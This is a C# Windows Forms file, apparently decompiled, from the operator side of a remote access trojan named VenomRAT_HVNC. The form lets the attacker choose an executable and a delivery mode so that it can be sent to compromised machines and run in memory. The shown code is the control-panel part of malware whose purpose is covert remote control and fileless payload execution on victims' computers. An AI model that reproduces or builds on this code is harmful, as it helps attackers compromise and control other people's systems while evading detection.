using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server
{
    public partial class FormSendFileToMemory : Form
    {
        public FormSendFileToMemory()
        {
            this.InitializeComponent();
        }

        private void SendFileToMemory_Load(object sender, EventArgs e)
        {
            this.comboBox1.SelectedIndex = 0;
            this.comboBox2.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = this.comboBox1.SelectedIndex;
            if (selectedIndex == 0)
            {
                this.label3.Visible = false;
                this.comboBox2.Visible = false;
                return;
            }
            if (selectedIndex != 1)
            {
                return;
            }
            this.label3.Visible = true;
            this.comboBox2.Visible = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "(*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
                    this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
                    this.toolStripStatusLabel1.ForeColor = Color.Green;
                    this.IsOK = true;
                    if (this.comboBox1.SelectedIndex != 0)
                    {
                        goto IL_DD;
                    }
                    try
                    {
                        new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
                        this.IsOK = true;
                        return;
                    }
                    catch
                    {
                        this.toolStripStatusLabel1.ForeColor = Color.Red;
                        ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
                        toolStripStatusLabel.Text += " Invalid!";
                        this.IsOK = false;
                        return;
                    }
                }
                this.toolStripStatusLabel1.Text = "";
                this.toolStripStatusLabel1.ForeColor = Color.Black;
                this.IsOK = true;
            IL_DD:;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (this.IsOK)
            {
                base.Hide();
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            this.IsOK = false;
            base.Hide();
        }

        private void guna2GroupBox1_Click(object sender, EventArgs e)
        {
        }

        public bool IsOK;
    }
}
